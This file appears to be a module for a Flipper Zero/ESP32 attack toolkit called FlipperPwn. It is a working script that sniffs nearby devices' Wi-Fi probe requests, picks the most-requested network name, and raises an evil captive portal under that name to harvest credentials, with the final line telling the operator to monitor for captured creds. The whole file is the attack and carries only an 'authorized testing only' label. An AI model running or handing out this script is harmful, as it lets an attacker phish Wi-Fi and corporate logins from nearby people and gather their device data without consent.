# FlipperPwn Module — Probe-Triggered Karma + Portal
# Sniff probe requests to learn which SSIDs nearby devices are searching for,
# then stand up an evil portal using the highest-value SSID. Targeted, not a
# broadcast karma — quieter and higher capture rate.
#
# Two-run workflow:
#   Run 1: sniff probes (Phase 1), review /logs/probes.log on the ESP32 SD or the
#          Flipper WiFi status view, pick the most-probed SSID.
#   Run 2: set TARGET_SSID to that SSID; the portal deploys with it (Phase 2).
#
# Single `PLATFORM ALL` block (see evil_twin.fpwn). Marauder command names/flags
# vary by fork — adjust the WIFI_CMD lines to your ESP32 build.
#
# REQUIREMENTS:
#   - ESP32 WiFi Dev Board + WiFi Marauder, SD card inserted
#   - AUTHORIZED TESTING ONLY

NAME        probe_karma_portal
DESCRIPTION Sniff probes to identify top-requested SSID, then deploy targeted evil portal
CATEGORY    credential
PLATFORMS   WIN,MAC,LINUX

OPTION SNIFF_SEC   45             "Seconds to sniff probe requests (more = more data)"
OPTION PORTAL      corporate_guest.html "Evil Portal HTML to serve"
OPTION TARGET_SSID Corp-Guest     "Target SSID (set from probe log on the second run)"

PLATFORM ALL
IF_CONNECTED
  # ── Phase 1: Passive probe sniffing ─────────────────────────────────────
  # Marauder: 'sniffprobe' logs probe-request SSIDs to /logs/probes.log.
  PRINT Phase 1: Sniffing probes {{SNIFF_SEC}}s
  LED_COLOR BLUE
  WIFI_CMD sniffprobe
  WIFI_WAIT {{SNIFF_SEC}}000
  WIFI_STOP

  # ── Phase 2: Targeted portal ────────────────────────────────────────────
  # Stage the page + AP name on the ESP32 and start the portal. Devices probing
  # for TARGET_SSID will associate and hit the captive page.
  PRINT Phase 2: Portal SSID {{TARGET_SSID}}
  LED_COLOR MAGENTA
  WIFI_CMD evilportal -c set html /portals/{{PORTAL}}
  WIFI_WAIT 500
  WIFI_CMD evilportal -c set ap {{TARGET_SSID}}
  WIFI_WAIT 500
  WIFI_CMD evilportal -c start

  # ── Phase 3: Report ─────────────────────────────────────────────────────
  LED_COLOR CYAN
  OPEN_NOTEPAD
  DELAY 1500
  STRINGLN === Probe Karma Portal ===
  STRINGLN Sniffed probes: check ESP32 SD /logs/probes.log
  STRINGLN Portal SSID: {{TARGET_SSID}}   Page: {{PORTAL}}
  STRINGLN On run 1, set TARGET_SSID to the most-probed network and re-run.
  LED_COLOR GREEN
  PRINT Portal active — monitor Flipper for creds
END_IF
